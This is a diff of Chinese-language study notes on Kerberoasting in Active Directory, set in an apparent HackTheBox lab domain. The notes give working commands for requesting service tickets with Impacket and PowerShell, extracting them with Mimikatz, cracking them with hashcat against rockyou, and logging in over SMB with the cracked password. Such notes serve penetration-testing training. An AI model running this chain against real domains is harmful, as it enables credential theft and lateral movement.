@@ -3,3 +3,52 @@ AD环境中的一种横向移动 (lateral movement)/权限提升 (privilege esca
 SPN 是 Kerberos 用来将服务实例映射到运行该服务的服务帐户的唯一标识符，就是一个服务
 需要一个帐户的明文密码（或 NTLM 哈希）、一个域用户帐户上下文中的 shell，或者在一台已加入域的主机上的 SYSTEM 级别访问权限
 
+
+多种攻击方式：
+未加入域的 Linux 主机，使用有效的域用户凭据。
+已加入域的 Linux 主机，在检索到 keytab 文件后以 root 身份执行。
+已加入域的 Windows 主机，以域用户身份进行身份验证。
+已加入域的 Windows 主机，拥有一个域帐户上下文中的 shell。
+已加入域的 Windows 主机上拥有 SYSTEM 权限。
+未加入域的 Windows 主机，使用 runas /netonly。
+多种工具：
+在未加入域的 Linux 主机上使用 Impacket 的 GetUserSPNs.py。
+结合使用内置的 setspn.exe Windows 二进制文件、PowerShell 和 Mimikatz。
+在 Windows 上，利用 PowerView、Rubeus 等工具以及其他 PowerShell 脚本。
+
+需要一套有效的域凭据和域控制器的 IP 地址。
+可以使用明文密码、NT 密码哈希，甚至 Kerberos 票据向域控制器进行身份验证
+
+票据仍需使用 Hashcat 等工具进行离线 cracked (破解) 以获取明文密码。
+但，与其他格式（如 NTLM 哈希）相比，TGS 票据需要更长的时间来破解，除非设置了弱密码，否则通常很难或不可能使用标准的破解设备获取明文。
+降级为中风险问题
+
+Linux攻击机
+下载impacket:
+https://github.com/fortra/impacket
+安装:
+sudo python3 -m pip install .
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend      列出 SPN 帐户，任何低权限的用户（forend）都可以
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request      拿NTLM加密的票据，可试hashcat或john破解
+mattchow@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev      只拿sqlde的票据
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs      票据存入sqldev_tgs文件
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt      破解出database!
+hashcat -m 13100 -w 3 -O sqldev_tgs /usr/share/wordlists/rockyou.txt --force      -w 3/4高功耗，-O优化GPU，--force忽略警告
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!      登录smb
+
+Windows攻击机
+setspn
+枚举域中的服务主体名称 (SPN)
+  https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
+C:\htb> setspn.exe -Q */*    域中的各种主机返回了许多不同的 SPN, 将重点关注用户账户 (user accounts)，忽略计算机账户
+C:\htb> Add-Type -AssemblyName System.IdentityModel    加载System.IdentityModel这个DLL库，用于构建安全令牌服务
+C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"      实例化类，并请求单个服务的票据，下一行是所有服务的票据
+C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+用MimiKatz从内存提取票据
+echo "<base64 blob>" |  tr -d \\n | base64 -d > sqldev.kirbi      用哈希替换掉<base64 blob>，然后删除echo产生的最后的最后换行，转成kirbi文件
+python2.7 kirbi2john.py sqldev.kirbi      创建一个名为 crack_file 的文件
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat      处理crack_file
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+
+
